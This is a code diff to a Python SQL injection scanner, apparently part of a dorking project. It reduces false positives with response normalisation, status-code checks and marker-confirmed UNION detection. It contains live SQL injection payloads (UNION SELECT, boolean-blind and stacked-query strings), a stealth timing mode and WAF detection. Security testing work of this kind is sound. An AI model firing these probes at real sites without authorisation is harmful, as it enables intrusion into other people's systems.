@@ -1,5 +1,5 @@
 """
-DorkEye SQLi Detector
+DorkEye SQLi
 ═══════════════════════════════════════════════════════════════
 Multi-method SQL injection for DorkEye Project
 
@@ -356,6 +356,33 @@ def _strip_script_tags(body: str) -> str:
 
 
 # ══════════════════════════════════════════════════════════════
+#  [FP-8] Dynamic-noise normalization
+# ══════════════════════════════════════════════════════════════
+#
+# Pages that embed a CSRF token, a nonce, a timestamp, or a session id
+# that rotates on *every* request produce body-level differences that
+# have nothing to do with the injected payload. Every diff/similarity
+# comparison in this module should run on normalized text, otherwise
+# that natural churn gets misread as a boolean/stacked-query signal.
+
+_DYNAMIC_NOISE_RE = re.compile(
+    r"(csrf[-_]?token[\"']?\s*[:=]\s*[\"'][^\"']{4,}[\"']"
+    r"|name=[\"']csrf[^\"']*[\"']\s+value=[\"'][^\"']*[\"']"
+    r"|\bnonce=[\"'][^\"']+[\"']"
+    r"|\bsession[_-]?id[\"']?\s*[:=]\s*[\"'][^\"']+[\"']"
+    r"|\b\d{10,13}\b"                                    # unix ts / millis
+    r"|\b20\d{2}-\d{2}-\d{2}[T ][\d:.Z+-]{5,}"            # ISO datetimes
+    r")",
+    re.IGNORECASE,
+)
+
+
+def _normalize_dynamic(body: str) -> str:
+    """Strip common ephemeral tokens before diffing two responses."""
+    return _DYNAMIC_NOISE_RE.sub("", body)
+
+
+# ══════════════════════════════════════════════════════════════
 #  WAF detection signatures
 # ══════════════════════════════════════════════════════════════
 
@@ -434,10 +461,10 @@ class SQLiDetector:
 
     Detection methods (run in order per parameter):
       1. error_based      — injects payloads that trigger DB error signatures
-      2. union_based      — probes column count (NULL + string columns)
+      2. union_based       — probes column count (NULL + string columns)
       3. boolean_blind    — dual-metric: length diff + similarity ratio
       4. time_based_blind — DB-specific SLEEP/pg_sleep/WAITFOR payloads
-      5. stacked_query    — lightweight stacked-query probe (new)
+      5. stacked_query     — lightweight stacked-query probe (new)
 
     Parameters are prioritised by attack surface before testing.
     A CircuitBreaker skips further requests to hosts that became unreachable.
@@ -508,6 +535,23 @@ class SQLiDetector:
             # [NEW-2] additional Oracle patterns
             r"PLS-\d{5}",
             r"TNS:\s+",
+        ],
+        # [FP-10] Microsoft Access / JET — missing entirely before this patch.
+        # testasp.vulnweb.com and many legacy classic-ASP demo/CTF targets run
+        # on Access via ODBC, which throws its own distinct error family (not
+        # the SQL-Server one above). Without these patterns, error-based SQLi
+        # against an Access backend can never match, regardless of how many
+        # payloads are sent.
+        "ms_access": [
+            r"Microsoft Access Driver",
+            r"ODBC Microsoft Access Driver",
+            r"Microsoft JET Database Engine",
+            r"\[Microsoft\]\[ODBC Microsoft Access Driver\]",
+            r"Syntax error \(missing operator\) in query expression",
+            r"Data type mismatch in criteria expression",
+            r"80040e14",
+            r"80040e10",
+            r"Microsoft OLE DB Provider for ODBC Drivers error",
         ],
         # [NEW-2] Generic bucket — catches miscellaneous DB frameworks
         "generic": [
@@ -774,6 +818,11 @@ class SQLiDetector:
             declare variation immediately without running difflib.
           - difflib comparison capped at first _PROBE_SAMPLE_BYTES (8 KB) of each
             body — same approach used in xss.py; prevents O(n²) on large pages.
+
+        [FP-8] All diffing now runs on dynamic-noise-normalized text, and the
+        final payload check also requires the HTTP status code to match the
+        baseline — a 200→500 flip alone is a strong signal already counted
+        elsewhere (error-based), not something this probe should amplify.
         """
         if self.circuit_breaker.is_dead(url):
             return False
@@ -783,16 +832,18 @@ class SQLiDetector:
             return False
 
         baseline_status: int       = r_init.status_code
+        norm_baseline               = _normalize_dynamic(baseline_content)
 
         # [FP-7] Fast-path threshold raised to _FP_FAST_PATH_BYTES (150 B).
         # The old 50-byte threshold was too easily hit by timestamps, nonces,
         # and counter values embedded in the page body.
-        if abs(len(baseline_content) - len(r_init.text)) > _FP_FAST_PATH_BYTES:
+        norm_r_init = _normalize_dynamic(r_init.text)
+        if abs(len(norm_baseline) - len(norm_r_init)) > _FP_FAST_PATH_BYTES:
             # Still build noise baseline — just mark this sample as noisy
             noise_samples: List[float] = [0.05]
         else:
-            b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
-            b2  = r_init.text[: _PROBE_SAMPLE_BYTES]
+            b1  = norm_baseline[: _PROBE_SAMPLE_BYTES]
+            b2  = norm_r_init[: _PROBE_SAMPLE_BYTES]
             first_sim                  = difflib.SequenceMatcher(None, b1, b2).ratio()
             noise_samples: List[float] = [1.0 - first_sim]
 
@@ -802,11 +853,12 @@ class SQLiDetector:
             r = self._get(url)
             if r is None:
                 return False
-            if abs(len(baseline_content) - len(r.text)) > _FP_FAST_PATH_BYTES:
+            norm_r = _normalize_dynamic(r.text)
+            if abs(len(norm_baseline) - len(norm_r)) > _FP_FAST_PATH_BYTES:
                 noise_samples.append(0.05)
             else:
-                b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
-                b2  = r.text[: _PROBE_SAMPLE_BYTES]
+                b1  = norm_baseline[: _PROBE_SAMPLE_BYTES]
+                b2  = norm_r[: _PROBE_SAMPLE_BYTES]
                 sim = difflib.SequenceMatcher(None, b1, b2).ratio()
                 noise_samples.append(1.0 - sim)
             _interruptible_sleep(0.2)
@@ -826,14 +878,25 @@ class SQLiDetector:
         if r_payload is None:
             return False
 
+        # [FP-10] A status-code flip caused by a single raw quote (e.g. 200→500)
+        # is itself a classic SQLi signal on legacy ASP/ODBC/MSSQL stacks, where
+        # an unhandled ADODB/ODBC error throws an unhandled server error. The
+        # previous version discarded the parameter here ("no reaction"), which
+        # silently skipped the full test suite on textbook-vulnerable targets
+        # such as testasp.vulnweb.com/showforum.asp?id=0 — classic ASP demo
+        # apps return 500 with the raw ODBC error in the body. Treat a status
+        # mismatch as confirmed variation instead of a reason to bail out; the
+        # downstream error-based test is what actually confirms/denies it.
         if r_payload.status_code != baseline_status:
-            return False
-
-        if abs(len(baseline_content) - len(r_payload.text)) > _FP_FAST_PATH_BYTES:
             return True
 
-        b1           = baseline_content[: _PROBE_SAMPLE_BYTES]
-        b2           = r_payload.text[: _PROBE_SAMPLE_BYTES]
+        norm_payload = _normalize_dynamic(r_payload.text)
+
+        if abs(len(norm_baseline) - len(norm_payload)) > _FP_FAST_PATH_BYTES:
+            return True
+
+        b1           = norm_baseline[: _PROBE_SAMPLE_BYTES]
+        b2           = norm_payload[: _PROBE_SAMPLE_BYTES]
         payload_noise = 1.0 - difflib.SequenceMatcher(None, b1, b2).ratio()
 
         return payload_noise > adaptive_threshold
@@ -852,6 +915,10 @@ class SQLiDetector:
         rotating content, timestamps) produce constant natural variation that
         is indistinguishable from boolean-blind SQLi signals. If stability
         falls below _PAGE_STABILITY_MIN the caller should skip boolean blind.
+
+        [FP-8] Compared on dynamic-noise-normalized text so that a page whose
+        only churn is a CSRF token / timestamp isn't marked unstable for a
+        reason that has nothing to do with content structure.
         """
         r1 = self._get(url)
         if r1 is None:
@@ -860,8 +927,8 @@ class SQLiDetector:
         r2 = self._get(url)
         if r2 is None:
             return 0.0
-        b1 = r1.text[:_PROBE_SAMPLE_BYTES]
-        b2 = r2.text[:_PROBE_SAMPLE_BYTES]
+        b1 = _normalize_dynamic(r1.text)[:_PROBE_SAMPLE_BYTES]
+        b2 = _normalize_dynamic(r2.text)[:_PROBE_SAMPLE_BYTES]
         return difflib.SequenceMatcher(None, b1, b2).ratio()
 
     # ──────────────────────────────────────────────────────────
@@ -1012,18 +1079,35 @@ class SQLiDetector:
         return result
 
     # ──────────────────────────────────────────────────────────
-    #  [2] Union-based — [NEW-8] NULL + string column probing
+    #  [2] Union-based — [FP-9] marker-confirmed instead of length-heuristic
     # ──────────────────────────────────────────────────────────
 
-    def _test_union_based(self, url: str, param_name: str, baseline_len: int) -> Dict:
+    def _test_union_based(self, url: str, param_name: str, baseline_len: int,
+                           baseline_status: int) -> Dict:
         """
-        Probe UNION SELECT column counts and look for mismatch errors or
-        abnormal response sizes.
+        Probe UNION SELECT column counts and look for mismatch errors or a
+        reflected marker value.
 
         [NEW-8] Tests two column-type strategies per column count:
           - NULL columns  — works on most DB types
-          - String columns ('a','b',...) — handles targets that reject NULL
-            but accept string literals (seen on some Oracle/MSSQL setups)
+          - String columns — handles targets that reject NULL but accept
+            string literals
+
+        [FP-9] The previous version flagged MEDIUM confidence whenever the
+        response size changed by >20% *and* any earlier column count had
+        produced a mismatch error — `bool(mismatch_at)` is true after the
+        very first mismatch, so every later unrelated size change at any
+        column count got counted as a hit. That's almost certainly your
+        biggest source of UNION false positives.
+
+        Replaced with a much stronger signal borrowed from sqlmap: inject a
+        unique random marker string as every string column and check whether
+        that exact marker is reflected back in the response body. A random
+        marker appearing verbatim in the page is strong, low-noise evidence
+        that the server actually executed our UNION SELECT — it can't be
+        explained by natural page churn. The old length-diff heuristic is
+        removed entirely; the column-mismatch regex (a real DB error message)
+        is kept as a separate, weaker LOW-confidence signal.
         """
         result = {
             "method":     "union_based",
@@ -1033,8 +1117,8 @@ class SQLiDetector:
             "waf":        None,
         }
 
+        marker = f"dkeyz{random.randint(10**6, 10**7 - 1)}xqz"
         mismatch_at: List[int] = []
-        string_cols  = lambda n: ",".join([f"'{'abcdefghij'[i % 10]}'" for i in range(n)])
 
         for n_cols in range(1, _UNION_COLUMNS_MAX + 1):
             if self.circuit_breaker.is_dead(url):
@@ -1043,16 +1127,15 @@ class SQLiDetector:
                 break
 
             null_cols = ",".join(["NULL"] * n_cols)
-            str_cols  = string_cols(n_cols)
+            str_cols  = ",".join([f"'{marker}'"] * n_cols)
 
-            # [NEW-8] Two payload groups: NULL and string-literal columns
             payloads = [
-                # NULL-based
+                # NULL-based — cheap probe for column-count errors
                 f"' UNION SELECT {null_cols}--",
                 f"' UNION SELECT {null_cols}#",
                 f"-1 UNION SELECT {null_cols}--",
                 f"0 UNION ALL SELECT {null_cols}--",
-                # [NEW-8] String-literal columns
+                # [FP-9] Marker-based — the only payloads that can confirm
                 f"' UNION SELECT {str_cols}--",
                 f"-1 UNION SELECT {str_cols}--",
             ]
@@ -1076,6 +1159,18 @@ class SQLiDetector:
 
                 body = response.text
 
+                # ── [FP-9] Primary signal: marker reflected verbatim ─────────
+                # Status must also match baseline — a marker appearing inside
+                # an unrelated error/debug page is not confirmation.
+                if marker in body and response.status_code == baseline_status:
+                    result["vulnerable"] = True
+                    result["confidence"] = SQLiConfidence.HIGH.value
+                    result["evidence"].append(
+                        f"UNION marker '{marker}' reflected verbatim at n={n_cols} "
+                        f"columns — server executed the injected UNION SELECT"
+                    )
+                    return result
+
                 if self._UNION_COL_MISMATCH_RE.search(body):
                     if n_cols not in mismatch_at:
                         mismatch_at.append(n_cols)
@@ -1095,27 +1190,18 @@ class SQLiDetector:
                     )
                     return result
 
-                len_diff = abs(len(body) - baseline_len)
-                if (response.status_code == 200
-                        and len_diff > baseline_len * 0.20
-                        and (n_cols in mismatch_at or bool(mismatch_at))):
-                    result["vulnerable"] = True
-                    result["confidence"] = SQLiConfidence.MEDIUM.value
-                    result["evidence"].append(
-                        f"UNION SELECT {n_cols} cols: response Δ={len_diff}B "
-                        f"(prev mismatches at cols {mismatch_at})"
-                    )
-                    return result
-
                 if self.stealth:
                     _interruptible_sleep(random.uniform(0.5, 1.5))
 
+        # [FP-9] Column-mismatch errors alone are a real (if weaker) DB signal —
+        # unlike the removed length-diff branch, this doesn't rely on an
+        # unrelated-column bug and is kept at LOW confidence only.
         if mismatch_at:
             result["vulnerable"] = True
             result["confidence"] = SQLiConfidence.LOW.value
             result["evidence"].append(
                 f"UNION col-mismatch at col(s) {mismatch_at}: "
-                f"UNION syntax processed by server"
+                f"UNION syntax processed by server (unconfirmed by marker — verify manually)"
             )
 
         return result
@@ -1125,7 +1211,7 @@ class SQLiDetector:
     # ──────────────────────────────────────────────────────────
 
     def _test_boolean_blind(self, url: str, param_name: str, baseline_len: int,
-                             baseline_content: str) -> Dict:
+                             baseline_content: str, baseline_status: int) -> Dict:
         """
         Send true/false boolean pairs and detect statistically significant differences.
 
@@ -1138,6 +1224,12 @@ class SQLiDetector:
 
         [NEW-5] Expanded from 4 to 8 payload pairs including DB-specific
           variants and comment-terminated forms.
+
+        [FP-8] Samples whose HTTP status code doesn't match the baseline are
+        discarded before computing any metric — a true/false pair that
+        differs only because one of them hit a 500 page isn't a boolean-blind
+        signal, it's an unrelated error being misread as one. Diffing also
+        runs on dynamic-noise-normalized text.
         """
         result = {
             "method":     "boolean_blind",
@@ -1173,10 +1265,13 @@ class SQLiDetector:
             ("1 AND CASE WHEN 1=2 THEN 1 ELSE 0 END=1", "false"),
         ]
 
+        norm_baseline = _normalize_dynamic(baseline_content)
+
         true_lengths:    List[int]   = []
         false_lengths:   List[int]   = []
         true_sims:       List[float] = []
         false_sims:      List[float] = []
+        status_mismatches = 0
 
         for payload, payload_type in bool_payloads:
             if self.circuit_breaker.is_dead(url):
@@ -1192,13 +1287,19 @@ class SQLiDetector:
                 if _exit_requested or _skip_current:
                     break
                 r = self._get(test_url)
-                if r is not None:
-                    sample_lengths.append(len(r.text))
-                    # [NEW-4] Also compute similarity ratio (sampled)
-                    b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
-                    b2  = r.text[: _PROBE_SAMPLE_BYTES]
-                    sim = difflib.SequenceMatcher(None, b1, b2).ratio()
-                    sample_sims.append(sim)
+                if r is None:
+                    continue
+                # [FP-8] Discard samples whose status code doesn't match the
+                # baseline — a 200 vs 500 split isn't a boolean-blind signal.
+                if r.status_code != baseline_status:
+                    status_mismatches += 1
+                    continue
+                norm_r = _normalize_dynamic(r.text)
+                sample_lengths.append(len(norm_r))
+                b1  = norm_baseline[: _PROBE_SAMPLE_BYTES]
+                b2  = norm_r[: _PROBE_SAMPLE_BYTES]
+                sim = difflib.SequenceMatcher(None, b1, b2).ratio()
+                sample_sims.append(sim)
                 if self.stealth:
                     _interruptible_sleep(random.uniform(0.5, 1))
 
@@ -1214,6 +1315,12 @@ class SQLiDetector:
                 _interruptible_sleep(random.uniform(1, 2))
 
         if not true_lengths or not false_lengths:
+            if status_mismatches > 0:
+                result["evidence"].append(
+                    f"[FP-guard] {status_mismatches} sample(s) discarded for "
+                    f"status-code mismatch vs baseline — insufficient clean "
+                    f"samples to compare"
+                )
             return result
 
         median_true_len   = statistics.median(true_lengths)
@@ -1266,8 +1373,11 @@ class SQLiDetector:
                 if rt is None or rf is None:
                     confirm_ok = False
                     break
-                confirm_true_lens.append(len(rt.text))
-                confirm_false_lens.append(len(rf.text))
+                if rt.status_code != baseline_status or rf.status_code != baseline_status:
+                    confirm_ok = False
+                    break
+                confirm_true_lens.append(len(_normalize_dynamic(rt.text)))
+                confirm_false_lens.append(len(_normalize_dynamic(rf.text)))
                 _interruptible_sleep(0.4)
 
             if confirm_ok and confirm_true_lens and confirm_false_lens:
@@ -1299,7 +1409,7 @@ class SQLiDetector:
                 result["confidence"] = SQLiConfidence.LOW.value
                 result["evidence"].append(
                     "Boolean dual-metric passed; triple-confirm inconclusive "
-                    "(network error during re-check) — LOW confidence"
+                    "(network error or status mismatch during re-check) — LOW confidence"
                 )
 
         elif len_condition:
@@ -1478,7 +1588,7 @@ class SQLiDetector:
     # ──────────────────────────────────────────────────────────
 
     def _test_stacked_query(self, url: str, param_name: str,
-                             baseline_content: str) -> Dict:
+                             baseline_content: str, baseline_status: int) -> Dict:
         """
         Lightweight probe for stacked-query (multiple statements) support.
 
@@ -1491,6 +1601,12 @@ class SQLiDetector:
         Confidence is capped at LOW because stacked-query support alone does
         not confirm exploitability — it signals that further manual testing
         is warranted.
+
+        [FP-8] Signal 2 now requires the status code to still match the
+        baseline before the similarity check runs — a response that merely
+        switched to an error page isn't "significant content change caused
+        by stacking", it's a different signal already captured elsewhere.
+        Diffing runs on normalized text.
         """
         result = {
             "method":     "stacked_query",
@@ -1498,6 +1614,8 @@ class SQLiDetector:
             "confidence": SQLiConfidence.NONE.value,
             "evidence":   [],
         }
+
+        norm_baseline = _normalize_dynamic(baseline_content)
 
         stacked_payloads = [
             "1'; SELECT NULL--",
@@ -1539,18 +1657,19 @@ class SQLiDetector:
                 )
                 return result
 
-            # Signal 2 — significant content change vs baseline
-            b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
-            b2  = response.text[: _PROBE_SAMPLE_BYTES]
-            sim = difflib.SequenceMatcher(None, b1, b2).ratio()
-            if sim < 0.80:
-                result["vulnerable"] = True
-                result["confidence"] = SQLiConfidence.LOW.value
-                result["evidence"].append(
-                    f"Stacked query caused significant content change "
-                    f"(similarity={sim:.2f}): payload: {payload[:50]}"
-                )
-                return result
+            # Signal 2 — significant content change vs baseline, same status
+            if response.status_code == baseline_status:
+                b1  = norm_baseline[: _PROBE_SAMPLE_BYTES]
+                b2  = _normalize_dynamic(response.text)[: _PROBE_SAMPLE_BYTES]
+                sim = difflib.SequenceMatcher(None, b1, b2).ratio()
+                if sim < 0.80:
+                    result["vulnerable"] = True
+                    result["confidence"] = SQLiConfidence.LOW.value
+                    result["evidence"].append(
+                        f"Stacked query caused significant content change "
+                        f"(similarity={sim:.2f}): payload: {payload[:50]}"
+                    )
+                    return result
 
             if self.stealth:
                 _interruptible_sleep(random.uniform(1.0, 2.0))
@@ -1644,7 +1763,9 @@ class SQLiDetector:
                     param_score += 2
 
             # ── Union-based ───────────────────────────────────────────────────
-            union_result = self._test_union_based(url, param_name, baseline_len)
+            union_result = self._test_union_based(
+                url, param_name, baseline_len, baseline_status
+            )
             union_result["parameter"] = param_name
             result["tests"].append(union_result)
 
@@ -1665,7 +1786,7 @@ class SQLiDetector:
             if _boolean_allowed:
                 # [NEW-4] Pass baseline_content for similarity-ratio metric
                 bool_result = self._test_boolean_blind(
-                    url, param_name, baseline_len, baseline_content
+                    url, param_name, baseline_len, baseline_content, baseline_status
                 )
             else:
                 bool_result = {
@@ -1696,7 +1817,9 @@ class SQLiDetector:
                 )
 
             # ── [NEW-6] Stacked-query probe ───────────────────────────────────
-            stacked_result = self._test_stacked_query(url, param_name, baseline_content)
+            stacked_result = self._test_stacked_query(
+                url, param_name, baseline_content, baseline_status
+            )
             stacked_result["parameter"] = param_name
             result["tests"].append(stacked_result)
             if stacked_result["vulnerable"]:
